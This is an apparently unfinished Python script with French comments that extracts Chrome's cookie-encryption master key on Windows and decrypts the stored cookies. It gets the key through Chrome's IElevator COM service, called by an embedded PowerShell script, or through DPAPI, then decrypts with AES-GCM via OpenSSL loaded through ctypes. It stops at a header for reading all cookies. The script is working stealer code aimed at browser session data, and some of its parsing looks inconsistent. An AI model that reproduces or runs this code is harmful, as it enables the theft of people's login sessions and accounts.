import os
import sqlite3
import shutil
import tempfile
import json
import base64
import hashlib
import ctypes
import ctypes.util
import subprocess


# ── IElevator COM (App-Bound Encryption, Windows Chrome 127+) ────────────────
# Chrome expose un service COM qui peut déchiffrer les clés pour le même user.

def _decrypt_app_bound_key_via_elevator(encrypted_key_b64):
    """
    Déchiffre la app_bound_encrypted_key via le service COM IElevator de Chrome.
    Nécessite que Chrome soit installé et le service actif.
    Utilise un sous-processus PowerShell pour appeler le COM sans dépendances.
    """
    ps_script = r"""
$ErrorActionPreference = 'Stop'
$encKeyB64 = '{ENC_KEY}'
$encKeyBytes = [Convert]::FromBase64String($encKeyB64)

# Instancier le service COM IElevator de Chrome
$elevator = New-Object -ComObject 'GoogleChromeElevationService.ElevatorClient' 2>$null
if (-not $elevator) {
    # Fallback : CLSID direct
    $clsid = [System.Type]::GetTypeFromCLSID([guid]'{708860E0-F641-4611-8895-7D867DD3675B}')
    $elevator = [System.Activator]::CreateInstance($clsid)
}

$decrypted = $null
$elevator.DecryptData($encKeyBytes, [ref]$decrypted)
[Convert]::ToBase64String($decrypted)
""".replace('{ENC_KEY}', encrypted_key_b64)

    result = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script],
        capture_output=True, text=True
    )
    if result.returncode != 0 or not result.stdout.strip():
        raise RuntimeError(
            f"IElevator COM échoué : {result.stderr.strip()}\n"
            "Vérifiez que Chrome est installé et le service actif."
        )
    return base64.b64decode(result.stdout.strip())


def _get_master_key_windows(local_state_path):
    """Récupère et déchiffre la clé maître depuis Local State."""
    with open(local_state_path, "r", encoding="utf-8") as f:
        state = json.load(f)

    os_crypt = state.get("os_crypt", {})

    # v20 : app_bound_encrypted_key
    if "app_bound_encrypted_key" in os_crypt:
        enc_b64 = os_crypt["app_bound_encrypted_key"]
        raw = _decrypt_app_bound_key_via_elevator(enc_b64)
        # Structure : [1 octet flags][12 oct IV][N oct payload][16 oct tag]
        # Le résultat de DecryptData est déjà la clé AES brute
        return raw  # 32 octets AES-256

    # v10/v11 : encrypted_key via DPAPI classique
    if "encrypted_key" in os_crypt:
        enc_key = base64.b64decode(os_crypt["encrypted_key"])[5:]  # strip "DPAPI"

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        p       = ctypes.create_string_buffer(enc_key)
        blobin  = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)
        )
        key = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return key

    raise RuntimeError("Aucune clé trouvée dans Local State")


# ── AES-256-GCM via OpenSSL ctypes ───────────────────────────────────────────

def aes_gcm_decrypt(key, iv, payload):
    lib_name = ctypes.util.find_library("crypto") or ctypes.util.find_library("ssl")
    if not lib_name:
        # Sur Windows, OpenSSL est embarqué dans Chrome lui-même
        # Chercher dans le répertoire Chrome
        chrome_dir = r"C:\Program Files\Google\Chrome\Application"
        for f in os.listdir(chrome_dir) if os.path.exists(chrome_dir) else []:
            if f.startswith("chrome_") and f.endswith(".dll"):
                lib_name = os.path.join(chrome_dir, f)
                break
    if not lib_name:
        raise RuntimeError("OpenSSL / libcrypto introuvable")

    lib = ctypes.CDLL(lib_name)
    lib.EVP_CIPHER_CTX_new.restype          = ctypes.c_void_p
    lib.EVP_aes_256_gcm.restype             = ctypes.c_void_p
    lib.EVP_DecryptInit_ex.argtypes         = [ctypes.c_void_p, ctypes.c_void_p,
                                               ctypes.c_void_p, ctypes.c_char_p,
                                               ctypes.c_char_p]
    lib.EVP_DecryptUpdate.argtypes          = [ctypes.c_void_p, ctypes.c_char_p,
                                               ctypes.POINTER(ctypes.c_int),
                                               ctypes.c_char_p, ctypes.c_int]
    lib.EVP_CIPHER_CTX_free.argtypes        = [ctypes.c_void_p]

    ctx = lib.EVP_CIPHER_CTX_new()
    lib.EVP_DecryptInit_ex(ctx, lib.EVP_aes_256_gcm(), None, None, None)
    lib.EVP_DecryptInit_ex(ctx, None, None, key, iv)
    out = ctypes.create_string_buffer(len(payload))
    n   = ctypes.c_int(0)
    lib.EVP_DecryptUpdate(ctx, out, ctypes.byref(n), payload, len(payload))
    lib.EVP_CIPHER_CTX_free(ctx)
    return out.raw[:n.value]


# ── Déchiffrement d'un cookie ─────────────────────────────────────────────────

def decrypt_cookie(enc, master_key):
    if not enc:
        return ""

    prefix = enc[:3]

    if prefix in (b"v20", b"v10", b"v11"):
        # Format : [3 oct prefix][1 oct?][12 oct IV][payload][16 oct tag GCM]
        if prefix == b"v20":
            iv      = enc[3:15]
            payload = enc[15:-16]
        else:
            iv      = enc[3:15]
            payload = enc[15:-16]
        return aes_gcm_decrypt(master_key, iv, payload).decode("utf-8", errors="replace")

    # Ancien format DPAPI direct (sans préfixe v1x)
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong),
                    ("pbData", ctypes.POINTER(ctypes.c_char))]
    p       = ctypes.create_string_buffer(enc)
    blobin  = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)
    )
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result.decode("utf-8", errors="replace")


# ── Lecture de tous les cookies ────────────────────────────────────────
